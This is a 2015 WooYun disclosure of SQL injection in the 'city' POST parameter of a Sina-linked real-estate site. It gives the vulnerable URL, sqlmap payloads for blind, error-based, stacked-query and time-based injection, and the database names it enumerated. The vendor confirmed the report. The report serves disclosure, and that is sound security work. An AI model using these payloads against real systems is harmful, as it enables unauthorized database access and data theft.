wybug_detail:
漏洞详情 披露状态：   									2015-02-26：	细节已通知厂商并且等待厂商处理中									2015-02-27：	厂商已经确认，细节仅向厂商公开									2015-03-09：	细节向核心白帽子及相关领域专家公开									2015-03-19：	细节向普通白帽子公开									2015-03-29：	细节向实习白帽子公开									2015-04-13：	细节向公众公开  简要描述： 新浪某站存在SQL注入 详细说明：  问题站：http://data.xiezilou.com（http://bj.office.sina.com.cn）问题处：http://data.xiezilou.com/index.php/?c=building&a=postScore&
city=bj&hid=3267&num=0%2C0%2C0%2C0%2C0%2C0%2C12.5%2C0
POST下参数city存在注入   漏洞证明：  
Place: POSTParameter: city    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: city=bj' RLIKE IF(1358=1358,0x626a,0x28) AND 'QVHv'='QVHv&hid=3267&num=0,0,0,0,0,0,12.5,0    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: city=bj' AND (SELECT 7030 FROM(SELECT COUNT(*),CONCAT(0x3a6f786d3a,(SELECT (CASE WHEN (7030=7030) THEN 1 ELSE 0 END)),0x3a796f663a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'uVwS'='uVwS&hid=3267&num=0,0,0,0,0,0,12.5,0    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: city=bj'; SELECT SLEEP(10)-- &hid=3267&num=0,0,0,0,0,0,12.5,0    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: city=bj' AND SLEEP(10) AND 'KWCc'='KWCc&hid=3267&num=0,0,0,0,0,0,12.5,0---[21:05:55] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5.0[21:05:55] [INFO] fetching database names[21:05:55] [INFO] the SQL query used returns 3 entries[21:05:55] [INFO] retrieved: information_schema[21:05:55] [INFO] retrieved: biz_sydc_sina_com_cn[21:05:55] [INFO] retrieved: testavailable databases [3]:[*] biz_sydc_sina_com_cn[*] information_schema[*] test
   修复方案：  你们比我懂   版权声明：转载请注明来源 小邪@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-02-27 09:54 厂商回复： 感谢支持，已经通知第三方合作业务进行修复 最新状态： 暂无
